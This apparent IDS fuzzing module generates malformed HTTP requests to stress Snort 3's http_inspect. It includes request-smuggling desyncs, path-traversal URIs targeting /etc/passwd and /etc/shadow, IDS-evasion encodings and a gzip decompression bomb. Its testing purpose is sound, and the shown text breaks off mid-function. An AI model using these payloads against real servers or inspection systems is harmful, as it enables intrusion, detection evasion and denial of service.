import gzip
import zlib
import struct
import random
from protocol.dynamic_data import get_commands, get_string_literals, random_buffer_size, has_dynamic_data

# ---------------------------------------------------------------------------
# HTTP mutation strategies for Snort 3 http_inspect (NHI) deep-packet testing.
#
# Two families:
#
# REQUEST-side (client -> server): every payload begins with a structurally
# VALID HTTP request line + Host header so Snort's wizard/service-binder
# classifies the stream as HTTP and engages http_inspect. The malice lives in
# the parts parsed after classification (URI normalisation, header table, chunk
# dechunker, Content-Length/Transfer-Encoding, decompression, etc.).
#
# RESPONSE-side (server -> client): models the HTTP Evader / "semantic gap"
# evasions (Steffen Ullrich, noxxi.de). These target how an IDS extracts the
# response body for malware analysis vs how a browser would — HTTP/0.9, deflate
# ambiguity, chunked tricks, stacked encodings, gzip quirks, whitespace/folding,
# "lucky number" status codes, NUL injection, version & header-end robustness.
# Response payloads must be delivered in the server->client direction (see
# StreamTransport.wrap_tcp_response_session).
# ---------------------------------------------------------------------------

HTTP_REQUEST_STRATEGIES = [
    "method_overflow",
    "header_bomb",
    "chunked_confusion",
    "request_smuggling",
    "uri_evasion",
    "pipeline_flood",
    "header_folding",
    "version_confusion",
    "content_length_attack",
    "multipart_boundary",
    "gzip_bomb",
    "absolute_uri_confusion",
    "method_fuzz",
    "header_field_fuzz",
    "partial_header_close",
]

HTTP_RESPONSE_STRATEGY_LIST = [
    "resp_http09",
    "resp_deflate_ambiguity",
    "resp_chunked_evasion",
    "resp_double_encoding",
    "resp_gzip_quirks",
    "resp_whitespace_evasion",
    "resp_lucky_status",
    "resp_nul_injection",
    "resp_version_confusion",
    "resp_header_end",
    "resp_content_length",
    "resp_js_normalization_crash",
]

HTTP_STRATEGIES = HTTP_REQUEST_STRATEGIES + HTTP_RESPONSE_STRATEGY_LIST

HTTP_RESPONSE_STRATEGIES = set(HTTP_RESPONSE_STRATEGY_LIST)

# Default base weights (aligned with HTTP_STRATEGIES order; normalised
# downstream). Request and response families each get ~50% of the mass.
HTTP_WEIGHTS = [
    5, 5, 6, 6, 4, 3, 2, 2, 3, 2, 2, 2, 4, 4, 6,  # request (15)
    5, 5, 6, 5, 5, 4, 4, 4, 4, 3, 5, 6,            # response (12)
]

HTTP_STRATEGY_LABELS = {
    "method_overflow":        "Method/URI Overflow",
    "header_bomb":            "Header Bomb",
    "chunked_confusion":      "Chunked Confusion (req)",
    "request_smuggling":      "Request Smuggling",
    "uri_evasion":            "URI Evasion",
    "pipeline_flood":         "Pipeline Flood",
    "header_folding":         "Header Folding (req)",
    "version_confusion":      "Version Confusion (req)",
    "content_length_attack":  "Content-Length Attack",
    "multipart_boundary":     "Multipart Boundary",
    "gzip_bomb":              "Gzip Bomb",
    "absolute_uri_confusion": "Absolute-URI Confusion",
    "method_fuzz":            "Method Fuzz (§9)",
    "header_field_fuzz":      "Header Field Fuzz (§14)",
    "resp_http09":            "Resp: HTTP/0.9 Bare Body",
    "resp_deflate_ambiguity": "Resp: Deflate Ambiguity",
    "resp_chunked_evasion":   "Resp: Chunked Evasion",
    "resp_double_encoding":   "Resp: Stacked Encoding",
    "resp_gzip_quirks":       "Resp: Gzip Quirks",
    "resp_whitespace_evasion":"Resp: Whitespace/Folding",
    "resp_lucky_status":      "Resp: Lucky-Number Status",
    "resp_nul_injection":     "Resp: Ctrl-Char Injection",
    "resp_version_confusion": "Resp: Version Confusion",
    "resp_header_end":        "Resp: Header-End Tricks",
    "resp_content_length":    "Resp: Content-Length Tricks",
    "partial_header_close":   "Partial Header + Close (CSCwu90024)",
    "resp_js_normalization_crash": "Resp: JS Normalization Crash (CSCwu24006/24015)",
}


def is_http_response_strategy(name: str) -> bool:
    """True if the strategy emits a server->client RESPONSE (vs a request)."""
    return name in HTTP_RESPONSE_STRATEGIES


# A canonical, valid request preamble used to "warm up" the inspector.
_HOST = b"Host: victim.example.com\r\n"

# Benign stand-in for hidden/"malicious" body content. NOT real EICAR — we are
# fuzzing the parser's body-extraction path, not testing AV signatures, and we
# don't want to trip the host's own antivirus.
_MARKER = b"FUZZ-HIDDEN-PAYLOAD-MARKER-0123456789ABCDEF"


def _gzip_blob(data: bytes) -> bytes:
    import io
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", compresslevel=9) as gz:
        gz.write(data)
    return buf.getvalue()


def _raw_deflate(data: bytes) -> bytes:
    """Raw DEFLATE, RFC 1951 (no zlib header/trailer) — accepted by all browsers."""
    co = zlib.compressobj(9, zlib.DEFLATED, -15)
    return co.compress(data) + co.flush()


def _zlib_deflate(data: bytes) -> bytes:
    """zlib-wrapped DEFLATE, RFC 1950 — what the HTTP 'deflate' name really means.
    Accepted by every browser except Internet Explorer."""
    return zlib.compress(data, 9)


def _make_gzip(data: bytes, flg: int = 0, fname: bytes = None, fcomment: bytes = None,
               fhcrc: bool = False, crc_ok: bool = True, isize_ok: bool = True,
               trunc: int = 0, raw_after: bytes = b"") -> bytes:
    """Construct a gzip stream (RFC 1952) with optional quirks/corruptions.

    flg        : extra FLG bits to OR in (e.g. 0xE0 for the reserved bits 5-7).
    fname      : if set, FNAME flag + NUL-terminated filename.
    fcomment   : if set, FCOMMENT flag + NUL-terminated comment.
    fhcrc      : if True, FHCRC flag + a 2-byte (intentionally arbitrary) header CRC.
    crc_ok     : if False, corrupt the trailing CRC-32.
    isize_ok   : if False, corrupt the trailing ISIZE.
    trunc      : drop this many bytes from the end (4 = no ISIZE, 8 = no CRC+ISIZE).
    raw_after  : extra uncompressed bytes appended after the complete gzip stream.
    """
    flg2 = flg
    if fname is not None:
        flg2 |= 0x08
    if fcomment is not None:
        flg2 |= 0x10
    if fhcrc:
        flg2 |= 0x02
    header = bytearray([0x1f, 0x8b, 0x08, flg2 & 0xFF])
    header += struct.pack("<I", 0)      # MTIME
    header += bytes([0x00, 0xff])       # XFL, OS=unknown
    if fname is not None:
        header += fname + b"\x00"
    if fcomment is not None:
        header += fcomment + b"\x00"
    if fhcrc:
        header += b"\x12\x34"           # arbitrary header CRC16 (browsers ignore mismatch)

    crc = zlib.crc32(data) & 0xFFFFFFFF
    if not crc_ok:
        crc ^= 0xFFFFFFFF
    isize = len(data) & 0xFFFFFFFF
    if not isize_ok:
        isize ^= 0xFFFFFFFF

    blob = bytes(header) + _raw_deflate(data) + struct.pack("<II", crc, isize)
    if trunc:
        blob = blob[:-trunc]
    return blob + raw_after


def _chunk(data: bytes) -> bytes:
    """A single chunk + terminating empty chunk."""
    return b"%x\r\n%s\r\n0\r\n\r\n" % (len(data), data)


def build_http_payload(strategy: str, payload_override=None) -> bytes:
    """
    Build an HTTP payload for the given strategy.

    Request strategies return a structurally valid HTTP/1.1 request that passes
    Snort's HTTP classification but stresses http_inspect's deep request parsing.
    Response strategies (resp_*) return a (possibly malformed) HTTP response and
    must be delivered server->client via wrap_tcp_response_session.
    """
    if strategy in HTTP_RESPONSE_STRATEGIES:
        return build_http_response(strategy, payload_override=payload_override)

    if strategy == "method_overflow":
        # Valid GET method (passes classification) but a colossal URI / query.
        # Targets http_inspect's request-line field allocation and the URI
        # normalisation buffer (HttpUri / scan() in http_msg_request.cc).
        variant = random.choice(["uri", "query", "many_segments", "long_method"])
        if variant == "uri":
            return b"GET /" + (b"A" * 65000) + b" HTTP/1.1\r\n" + _HOST + b"\r\n"
        elif variant == "query":
            return (b"GET /search?q=" + (b"x=1&" * 16000) +
                    b" HTTP/1.1\r\n" + _HOST + b"\r\n")
        elif variant == "many_segments":
            # 8000 path segments — stresses the path-splitting normaliser.
            uri = b"/" + b"/".join(b"a" for _ in range(8000))
            return b"GET " + uri + b" HTTP/1.1\r\n" + _HOST + b"\r\n"
        else:  # long_method — oversized method token. Starts with a real method
            # ("GET") so Snort's wizard still fingerprints the stream as HTTP and
            # engages http_inspect, which then chokes on the 40 KB method field.
            return b"GET" + (b"A" * 40000) + b" / HTTP/1.1\r\n" + _HOST + b"\r\n"

    elif strategy == "header_bomb":
        # Saturate the header field table. http_inspect tracks every header in
        # a structure with a finite reserve; thousands of fields / one giant
        # field exercise reallocation and the 'too many headers' event path.
        variant = random.choice(["many_headers", "giant_value", "giant_name", "dup_headers"])
        lines = [b"GET / HTTP/1.1\r\n", _HOST]
        if variant == "many_headers":
            for i in range(8000):
                lines.append(b"X-Custom-%d: %d\r\n" % (i, i))
        elif variant == "giant_value":
            lines.append(b"X-Big: " + (b"V" * 60000) + b"\r\n")
        elif variant == "giant_name":
            lines.append((b"X" * 50000) + b": 1\r\n")
        else:  # dup_headers — same header repeated; tests dedup/normalisation
            for _ in range(6000):
                lines.append(b"Cookie: session=" + bytes(random.choices(b"abcdef0123456789", k=16)) + b"\r\n")
        lines.append(b"\r\n")
        return b"".join(lines)

    elif strategy == "chunked_confusion":
        # Malformed Transfer-Encoding: chunked bodies. Targets the dechunker in
        # http_msg_body_chunk.cc: oversized/overflowing chunk-size hex, chunk
        # extensions, missing terminators, and size/data mismatches.
        head = b"POST /upload HTTP/1.1\r\n" + _HOST + b"Transfer-Encoding: chunked\r\n\r\n"
        if payload_override is not None:
            return head + b"4\r\n" + payload_override + b"\r\n0\r\n\r\n"
        variant = random.choice([
            "huge_chunk_size", "size_overflow", "negative_chunk", "chunk_ext_flood",
            "mismatch", "no_terminator", "bare_lf_chunk",
        ])
        if variant == "huge_chunk_size":
            # Declares 0xFFFFFFFF bytes but sends only a few — dechunker waits /
            # over-reads against the advertised length.
            return head + b"FFFFFFFF\r\n" + (b"A" * 16) + b"\r\n0\r\n\r\n"
        elif variant == "size_overflow":
            # 16+ hex digits → overflows a 32/64-bit chunk-length accumulator.
            return head + b"FFFFFFFFFFFFFFFF\r\n" + (b"B" * 32) + b"\r\n0\r\n\r\n"
        elif variant == "negative_chunk":
            return head + b"-1\r\nAAAA\r\n0\r\n\r\n"
        elif variant == "chunk_ext_flood":
            # Chunk extensions (;name=value) repeated to overflow the ext parser.
            ext = b";" + (b"e=" + b"x" * 200 + b";") * 50
            return head + b"4" + ext + b"\r\nDATA\r\n0\r\n\r\n"
        elif variant == "mismatch":
            # Size says 4 but 4000 bytes of data follow before the CRLF.
            return head + b"4\r\n" + (b"C" * 4000) + b"\r\n0\r\n\r\n"
        elif variant == "no_terminator":
            # Valid chunk then EOF with no terminating 0-chunk.
            return head + b"5\r\nHELLO\r\n"
        else:  # bare_lf_chunk — LF-only separators instead of CRLF
            return head + b"4\nDATA\n0\n\n"

    elif strategy == "request_smuggling":
        # CL.TE / TE.CL desync + obfuscated Transfer-Encoding. The classic class
        # of bugs where Snort and the backend disagree on message boundaries,
        # letting a smuggled request hide inside the body of the first.
        if payload_override is not None:
            body = (b"0\r\n\r\nPOST /smuggled HTTP/1.1\r\n" + _HOST +
                    b"Content-Length: %d\r\n\r\n" % len(payload_override) +
                    payload_override)
            return (b"POST / HTTP/1.1\r\n" + _HOST +
                    b"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n" +
                    body)
        variant = random.choice([
            "cl_te", "te_cl", "te_dup_obfuscated", "te_space_colon",
            "te_tab", "double_cl",
        ])
        if variant == "cl_te":
            # CL says 6, but chunked says the body ends at "0\r\n\r\n"; the bytes
            # after become a smuggled request to whatever disagrees.
            body = b"0\r\n\r\nGET /smuggled HTTP/1.1\r\n" + _HOST + b"\r\n"
            return (b"POST / HTTP/1.1\r\n" + _HOST +
                    b"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n" + body)
        elif variant == "te_cl":
            return (b"POST / HTTP/1.1\r\n" + _HOST +
                    b"Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n"
                    b"5c\r\nGET /smuggled HTTP/1.1\r\n" + _HOST + b"\r\n0\r\n\r\n")
        elif variant == "te_dup_obfuscated":
            # Two Transfer-Encoding headers, second one bogus — parsers that use
            # the first vs last value disagree.
            return (b"POST / HTTP/1.1\r\n" + _HOST +
                    b"Transfer-Encoding: chunked\r\nTransfer-Encoding: cow\r\n\r\n"
                    b"0\r\n\r\n")
        elif variant == "te_space_colon":
            # Space before the colon — some parsers ignore the header, some honour it.
            return (b"POST / HTTP/1.1\r\n" + _HOST +
                    b"Transfer-Encoding : chunked\r\nContent-Length: 4\r\n\r\nXXXX")
        elif variant == "te_tab":
            # Tab/vertical-whitespace obfuscation of the chunked value.
            return (b"POST / HTTP/1.1\r\n" + _HOST +
                    b"Transfer-Encoding:\tchunked\r\n\r\n0\r\n\r\n")
        else:  # double_cl — two conflicting Content-Length values
            return (b"POST / HTTP/1.1\r\n" + _HOST +
                    b"Content-Length: 8\r\nContent-Length: 7\r\n\r\nSMUGGLED")

    elif strategy == "uri_evasion":
        # URI normalisation bypasses targeting http_inspect's normalizer
        # (utf8, iis_unicode, double-decode, backslash, bare paths).
        if payload_override is not None:
            encoded = b''.join(b'%%%02X' % c for c in payload_override)
            return b"GET /" + encoded + b" HTTP/1.1\r\n" + _HOST + b"\r\n"
        variant = random.choice([
            "double_encode", "overlong_utf8", "dot_segments", "null_byte",
            "backslash", "unicode", "mixed_case_hex", "tab_in_uri",
            # Metasploit HTTP evasion techniques (IDS-Evasion article)
            "uri_fake_end", "uri_fake_params_start", "self_reference",
            "method_uri_tab", "uri_version_tab", "method_case_mix",
        ])
        if variant == "double_encode":
            # %252e%252e%252f → decodes once to %2e%2e%2f → again to ../
            uri = b"/app/" + (b"%252e%252e%252f" * 20) + b"etc/passwd"
        elif variant == "overlong_utf8":
            # Overlong UTF-8 for '.' (C0 AE) and '/' (C0 AF) — IDS/server decode mismatch.
            uri = b"/" + (b"%c0%ae%c0%ae%c0%af" * 20) + b"etc/passwd"
        elif variant == "dot_segments":
            uri = b"/a/" + (b"../" * 2000) + b"etc/passwd"
        elif variant == "null_byte":
            # %00 truncation: IDS sees the full path, server may truncate.
            uri = b"/safe%00/../../../../etc/passwd"
        elif variant == "backslash":
            uri = b"/app" + (b"\\..\\" * 1000) + b"windows\\win.ini"
        elif variant == "unicode":
            # %u-style IIS unicode encodings.
            uri = b"/" + (b"%u002e%u002e%u2215" * 20) + b"etc/passwd"
        elif variant == "mixed_case_hex":
            uri = b"/" + (b"%2E%2e%2F%2f" * 50) + b"secret"
        elif variant == "tab_in_uri":
            uri = b"/path\twith\x0bcontrol\x0cchars/" + b"A" * 100
        elif variant == "uri_fake_end":
            # Metasploit HTTP::uri_fake_end — insert a fake HTTP version inside
            # the URI. Snort's request-line tokenizer may split at the first
            # "HTTP/" and see a truncated path + wrong version, while the
            # server treats %20 as a literal space in the encoded URI.
            uri = b"/page/%20HTTP/1.0/../../admin/secret"
        elif variant == "uri_fake_params_start":
            # Metasploit HTTP::uri_fake_params_start — %3f decodes to '?'.
            # IDS may think query params started (stops path analysis at '?').
            # Server decodes %3f AFTER path parsing, treating it as path char.
            uri = b"/%3fa=benign/../../../etc/shadow"
        elif variant == "self_reference":
            # Metasploit HTTP::uri_dir_self_reference — /./  segments that
            # resolve to the same directory but change the byte pattern for
            # content-matching rules.
            uri = b"/" + b"./" * 500 + b"admin/config"
        else:
            uri = None

        if uri is not None:
            return b"GET " + uri + b" HTTP/1.1\r\n" + _HOST + b"\r\n"

        # Variants that modify the request-line structure itself (not just URI)
        if variant == "method_uri_tab":
            # Metasploit HTTP::pad_method_uri_type — TAB or multiple spaces
            # between HTTP method and URI. Tests request-line tokenizer.
            seps = [b"\t", b"  ", b"\t\t", b" \t ", b"\t \t"]
            lines = []
            for i in range(500):
                sep = random.choice(seps)
                lines.append(b"GET" + sep + b"/page%d HTTP/1.1\r\n" % i
                             + _HOST + b"\r\n")
            return b"".join(lines)
        elif variant == "uri_version_tab":
            # Metasploit HTTP::pad_uri_version_type — TAB between URI and
            # HTTP version string. Tests if tokenizer requires exactly one space.
            seps = [b"\t", b"\t\t", b" \t", b"\t "]
            lines = []
            for i in range(500):
                sep = random.choice(seps)
                lines.append(b"GET /page%d" % i + sep + b"HTTP/1.1\r\n"
                             + _HOST + b"\r\n")
            return b"".join(lines)
        else:  # method_case_mix
            # Metasploit HTTP::method_random_case — mixed casing of known
            # methods. Tests whether http_inspect normalises method case
            # before rule matching via the http_method buffer.
            methods = [b"GET", b"POST", b"PUT", b"DELETE", b"HEAD", b"OPTIONS"]
            lines = []
            for i in range(500):
                m = bytearray(random.choice(methods))
                for j in range(len(m)):
                    if random.random() < 0.5:
                        m[j] = m[j] ^ 0x20  # toggle case
                lines.append(bytes(m) + b" /p%d HTTP/1.1\r\n" % i
                             + _HOST + b"Content-Length: 0\r\n\r\n")
            return b"".join(lines)

    elif strategy == "pipeline_flood":
        # Hundreds of complete, pipelined requests in a single TCP session.
        # Stresses http_inspect's per-transaction state machine and the
        # request/response pairing across message boundaries.
        variant = random.choice(["uniform", "varied_methods", "keepalive_storm"])
        reqs = []
        if variant == "uniform":
            for i in range(2000):
                reqs.append(b"GET /page%d HTTP/1.1\r\n" % i + _HOST + b"\r\n")
        elif variant == "varied_methods":
            methods = [b"GET", b"POST", b"HEAD", b"PUT", b"DELETE", b"OPTIONS", b"TRACE"]
            for i in range(1500):
                m = random.choice(methods)
                reqs.append(m + b" /r%d HTTP/1.1\r\n" % i + _HOST +
                            b"Content-Length: 0\r\n\r\n")
        else:  # keepalive_storm — explicit keep-alive to keep the session open
            for i in range(2000):
                reqs.append(b"GET /k%d HTTP/1.1\r\n" % i + _HOST +
                            b"Connection: keep-alive\r\n\r\n")
        return b"".join(reqs)

    elif strategy == "header_folding":
        # Obsolete line folding (RFC 7230 deprecated) + bare CR / bare LF.
        # Forces http_inspect's header line reassembly through rarely-hit paths.
        if payload_override is not None:
            head = b"GET / HTTP/1.1\r\n" + _HOST
            return head + b"X-Data: " + payload_override + b"\r\n\t continuation\r\n\r\n"
        variant = random.choice(["obs_fold", "bare_cr", "bare_lf", "mixed_eol", "leading_ws"])
        head = b"GET / HTTP/1.1\r\n" + _HOST
        if variant == "obs_fold":
            lines = [head]
            for i in range(2000):
                lines.append(b"X-Fold%d: start\r\n\t continued-value-folded\r\n" % i)
            lines.append(b"\r\n")
            return b"".join(lines)
        elif variant == "bare_cr":
            # Lone CR (no LF) as a separator.
            return head + b"X-Test: a\rX-Inject: b\r\n\r\n"
        elif variant == "bare_lf":
            return b"GET / HTTP/1.1\nHost: victim\nX-Test: a\n\n"
        elif variant == "mixed_eol":
            endings = [b"\r\n", b"\n", b"\r", b"\n\r"]
            lines = [head]
            for i in range(2000):
                lines.append(b"X-H%d: v" % i + random.choice(endings))
            lines.append(b"\r\n")
            return b"".join(lines)
        else:  # leading_ws — value lines starting with spaces/tabs
            return head + b"X-A:\t\t\t   spaced\r\n   \r\nX-B: 1\r\n\r\n"

    elif strategy == "version_confusion":
        # Malformed / edge-case HTTP versions in the request line.
        variant = random.choice([
            "http09", "high_version", "overflow_minor", "extra_dots",
            "no_version", "leading_zeros",
        ])
        if variant == "http09":
            # HTTP/0.9 simple request (no version, no headers).
            return b"GET /\r\n"
        elif variant == "high_version":
            return b"GET / HTTP/9.9\r\n" + _HOST + b"\r\n"
        elif variant == "overflow_minor":
            return b"GET / HTTP/1.4294967296\r\n" + _HOST + b"\r\n"
        elif variant == "extra_dots":
            return b"GET / HTTP/1.1.1.1\r\n" + _HOST + b"\r\n"
        elif variant == "no_version":
            return b"GET /\r\n" + _HOST + b"\r\n"
        else:  # leading_zeros
            return b"GET / HTTP/01.01\r\n" + _HOST + b"\r\n"

    elif strategy == "content_length_attack":
        if payload_override is not None:
            return (b"POST / HTTP/1.1\r\n" + _HOST +
                    b"Content-Length: 0\r\n\r\n" + payload_override)
        # Integer-parsing torture for the Content-Length field, which drives
        # http_inspect's body-length tracking.
        variant = random.choice([
            "huge", "negative", "plus_sign", "hex", "leading_zeros",
            "whitespace", "multiple_conflict",
        ])
        head = b"POST / HTTP/1.1\r\n" + _HOST
        if variant == "huge":
            return head + b"Content-Length: 999999999999999999999\r\n\r\nAAAA"
        elif variant == "negative":
            return head + b"Content-Length: -1\r\n\r\nAAAA"
        elif variant == "plus_sign":
            return head + b"Content-Length: +100\r\n\r\nAAAA"
        elif variant == "hex":
            return head + b"Content-Length: 0x10\r\n\r\nAAAA"
        elif variant == "leading_zeros":
            return head + b"Content-Length: 00000000004\r\n\r\nAAAA"
        elif variant == "whitespace":
            return head + b"Content-Length:    4   \r\n\r\nAAAA"
        else:  # multiple_conflict
            return head + b"Content-Length: 10\r\nContent-Length: 4\r\n\r\nAAAA"

    elif strategy == "multipart_boundary":
        if payload_override is not None:
            boundary = b"----WebKitFormBoundaryFuzz12345678"
            sep = b"--" + boundary + b"\r\n"
            part = (sep + b'Content-Disposition: form-data; name="f"; filename="x"\r\n'
                    b"Content-Type: application/octet-stream\r\n\r\n" +
                    payload_override + b"\r\n")
            body = part + b"--" + boundary + b"--\r\n"
            return (b"POST /upload HTTP/1.1\r\n" + _HOST +
                    b"Content-Type: multipart/form-data; boundary=" + boundary +
                    b"\r\nContent-Length: %d\r\n\r\n" % len(body) + body)
        # multipart/form-data boundary parser stress. Targets the MIME boundary
        # scanner used when http_inspect hands the body to file/MIME processing.
        variant = random.choice([
            "missing_close", "oversized_boundary", "nested", "many_parts", "bad_boundary",
        ])
        if variant == "oversized_boundary":
            boundary = b"b" * 8000
        elif variant == "bad_boundary":
            boundary = b'has spaces and "quotes" and \x00null'
        else:
            boundary = b"----WebKitFormBoundary" + bytes(random.choices(b"abcdef0123456789", k=12))
        head = (b"POST /upload HTTP/1.1\r\n" + _HOST +
                b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n")
        sep = b"--" + boundary + b"\r\n"
        part = (sep + b'Content-Disposition: form-data; name="f"; filename="x"\r\n'
                b"Content-Type: application/octet-stream\r\n\r\n" + b"D" * 64 + b"\r\n")
        if variant == "missing_close":
            body = part * 50  # never sends the closing --boundary--
        elif variant == "nested":
            body = sep + b"Content-Type: multipart/mixed; boundary=" + boundary + b"\r\n\r\n" + part * 20
        elif variant == "many_parts":
            body = part * 3000 + b"--" + boundary + b"--\r\n"
        else:
            body = part + b"--" + boundary + b"--\r\n"
        return head + b"Content-Length: %d\r\n\r\n" % len(body) + body

    elif strategy == "gzip_bomb":
        if payload_override is not None:
            blob = _gzip_blob(payload_override)
            return (b"POST / HTTP/1.1\r\n" + _HOST +
                    b"Content-Encoding: gzip\r\nContent-Length: %d\r\n\r\n" %
                    len(blob) + blob)
        # Content-Encoding decompression attacks against http_inspect's unzip.
        variant = random.choice(["bomb", "malformed_gzip", "lying_encoding", "double_gzip"])
        head = b"POST / HTTP/1.1\r\n" + _HOST
        if variant == "bomb":
            # Highly compressible payload: ~5 MB of zeros → tiny on the wire,
            # large on inflate. Stresses the decompressor's output bound.
            blob = _gzip_blob(b"\x00" * (5 * 1024 * 1024))
            return (head + b"Content-Encoding: gzip\r\nContent-Length: %d\r\n\r\n" % len(blob) + blob)
        elif variant == "malformed_gzip":
            # Valid gzip magic + header, then garbage — breaks the inflate state machine.
            blob = b"\x1f\x8b\x08\x00" + bytes(random.choices(range(256), k=2000))
            return (head + b"Content-Encoding: gzip\r\nContent-Length: %d\r\n\r\n" % len(blob) + blob)
        elif variant == "double_gzip":
            blob = _gzip_blob(_gzip_blob(b"A" * 100000))
            return (head + b"Content-Encoding: gzip, gzip\r\nContent-Length: %d\r\n\r\n" % len(blob) + blob)
        else:  # lying_encoding — declares gzip but body is plaintext
            body = b"this is definitely not gzip" * 100
            return (head + b"Content-Encoding: gzip\r\nContent-Length: %d\r\n\r\n" % len(body) + body)

    elif strategy == "absolute_uri_confusion":
        # Absolute-form / authority-form targets + Host header confusion.
        # http_inspect must reconcile the request-target host with the Host
        # header; mismatches and oversize values stress that logic.
        if payload_override is not None:
            encoded = b''.join(b'%%%02X' % c for c in payload_override)
            return b"GET http://t/" + encoded + b" HTTP/1.1\r\n" + _HOST + b"\r\n"
        variant = random.choice([
            "absolute_form", "embedded_creds", "multi_host", "oversized_host",
            "authority_form", "host_port_junk",
        ])
        if variant == "absolute_form":
            return (b"GET http://attacker.evil.com/path HTTP/1.1\r\n" + _HOST + b"\r\n")
        elif variant == "embedded_creds":
            return (b"GET http://user:pass@victim.example.com@evil.com/ HTTP/1.1\r\n" + _HOST + b"\r\n")
        elif variant == "multi_host":
            return (b"GET / HTTP/1.1\r\nHost: a.com\r\nHost: b.com\r\nHost: c.com\r\n\r\n")
        elif variant == "oversized_host":
            return (b"GET / HTTP/1.1\r\nHost: " + (b"h" * 60000) + b".com\r\n\r\n")
        elif variant == "authority_form":
            # CONNECT-style authority form sent on a normal request.
            return (b"GET victim.example.com:80 HTTP/1.1\r\n" + _HOST + b"\r\n")
        else:  # host_port_junk
            return (b"GET / HTTP/1.1\r\nHost: victim.example.com:99999999999\r\n\r\n")

    elif strategy == "method_fuzz":
        # RFC 2616 §9 — exercise each method's specific parsing/handling rules,
        # plus malformed method tokens and method<->URI separator edge cases.
        # http_inspect special-cases known methods (CONNECT authority-form,
        # HEAD/204/304 bodiless responses, OPTIONS *, body-bearing PUT/DELETE).
        variant = random.choice([
            "options_star", "options_uri", "connect_authority", "connect_bad_port",
            "trace_body", "head_body", "put_body", "delete_body",
            "lowercase_method", "unknown_method", "case_mixed",
            "tab_separator", "multi_space", "no_uri", "leading_space", "extra_field",
        ])
        if variant == "options_star":
            # OPTIONS * — the only legitimate use of "*" as the request target.
            return (b"OPTIONS * HTTP/1.1\r\n" + _HOST +
                    b"Max-Forwards: 0\r\n\r\n")
        if variant == "options_uri":
            return (b"OPTIONS /path HTTP/1.1\r\n" + _HOST + b"\r\n")
        if variant == "connect_authority":
            # Real CONNECT with authority-form target (host:port, no scheme/path).
            return (b"CONNECT victim.example.com:443 HTTP/1.1\r\n" + _HOST + b"\r\n")
        if variant == "connect_bad_port":
            return (b"CONNECT victim.example.com:99999999999 HTTP/1.1\r\n" + _HOST + b"\r\n")
        if variant == "trace_body":
            # TRACE must not carry a body — sending one stresses that rule.
            body = b"SHOULD-NOT-BE-HERE"
            return (b"TRACE /diag HTTP/1.1\r\n" + _HOST +
                    b"Content-Length: %d\r\n\r\n" % len(body) + body)
        if variant == "head_body":
            # HEAD with a declared body; response must be bodiless regardless.
            return (b"HEAD / HTTP/1.1\r\n" + _HOST + b"Content-Length: 5\r\n\r\nAAAAA")
        if variant == "put_body":
            body = b"P" * 4096
            return (b"PUT /resource HTTP/1.1\r\n" + _HOST +
                    b"Content-Length: %d\r\n\r\n" % len(body) + body)
        if variant == "delete_body":
            return (b"DELETE /resource HTTP/1.1\r\n" + _HOST +
                    b"Content-Length: 4\r\n\r\nXXXX")
        if variant == "lowercase_method":
            # Methods are case-SENSITIVE; "get" is not "GET".
            return (b"get / HTTP/1.1\r\n" + _HOST + b"\r\n")
        if variant == "unknown_method":
            # Use dynamically extracted command if available
            dyn_cmds = get_commands() if has_dynamic_data() else []
            method = random.choice(dyn_cmds).encode("utf-8") if dyn_cmds else b"FOOBAR"
            return (method + b" / HTTP/1.1\r\n" + _HOST + b"\r\n")
        if variant == "case_mixed":
            return (b"GeT / HTTP/1.1\r\n" + _HOST + b"\r\n")
        if variant == "tab_separator":
            # Tab instead of space between method and URI.
            return (b"GET\t/ HTTP/1.1\r\n" + _HOST + b"\r\n")
        if variant == "multi_space":
            return (b"GET    /     HTTP/1.1\r\n" + _HOST + b"\r\n")
        if variant == "no_uri":
            # Method then straight to version, missing the request target.
            return (b"GET HTTP/1.1\r\n" + _HOST + b"\r\n")
        if variant == "leading_space":
            return (b" GET / HTTP/1.1\r\n" + _HOST + b"\r\n")
        # extra_field — a 4th token on the request line after the version.
        return (b"GET / HTTP/1.1 extra\r\n" + _HOST + b"\r\n")

    elif strategy == "header_field_fuzz":
        # RFC 2616 §14 — fuzz the request headers that an IDS actually parses
        # (range reassembly, expect/continue, transfer/upgrade negotiation,
        # base64 Authorization, encoding negotiation, cache directives). Inert
        # hint headers (Accept-Language, User-Agent, Referer, ...) are omitted
        # deliberately — they have no parser bug surface in http_inspect.
        head = b"GET /resource HTTP/1.1\r\n" + _HOST
        variant = random.choice([
            "range_basic", "range_overlap", "range_huge", "range_negative",
            "range_many", "range_suffix", "if_range", "content_range_req",
            "expect_100", "expect_unknown", "te_header", "trailer",
            "upgrade", "authorization_b64", "authorization_junk",
            "accept_encoding_many", "cache_control", "max_forwards_huge",
        ])
        if variant == "range_basic":
            return head + b"Range: bytes=0-1023\r\n\r\n"
        if variant == "range_overlap":
            # Overlapping/out-of-order ranges — reassembly bookkeeping stress.
            return head + b"Range: bytes=0-100,50-200,150-300,0-500\r\n\r\n"
        if variant == "range_huge":
            return head + b"Range: bytes=0-99999999999999999999\r\n\r\n"
        if variant == "range_negative":
            return head + b"Range: bytes=-1-10\r\n\r\n"
        if variant == "range_many":
            spec = b",".join(b"%d-%d" % (i, i + 1) for i in range(0, 8000, 2))
            return head + b"Range: bytes=" + spec + b"\r\n\r\n"
        if variant == "range_suffix":
            return head + b"Range: bytes=-500\r\n\r\n"
        if variant == "if_range":
            return head + b'If-Range: "etag-value"\r\nRange: bytes=0-99\r\n\r\n'
        if variant == "content_range_req":
            # Content-Range on a request (unusual) with a bad unit/length.
            return (head + b"Content-Range: bytes 0-99/*\r\nContent-Length: 4\r\n\r\nAAAA")
        if variant == "expect_100":
            return head + b"Expect: 100-continue\r\nContent-Length: 4\r\n\r\nAAAA"
        if variant == "expect_unknown":
            return head + b"Expect: 999-frobnicate\r\n\r\n"
        if variant == "te_header":
            # TE (acceptable transfer-codings) with trailers/q-values.
            return head + b"TE: trailers, deflate;q=0.5, gzip;q=0\r\n\r\n"
        if variant == "trailer":
            return (b"POST / HTTP/1.1\r\n" + _HOST +
                    b"Transfer-Encoding: chunked\r\nTrailer: X-Checksum\r\n\r\n"
                    b"4\r\nDATA\r\n0\r\nX-Checksum: deadbeef\r\n\r\n")
        if variant == "upgrade":
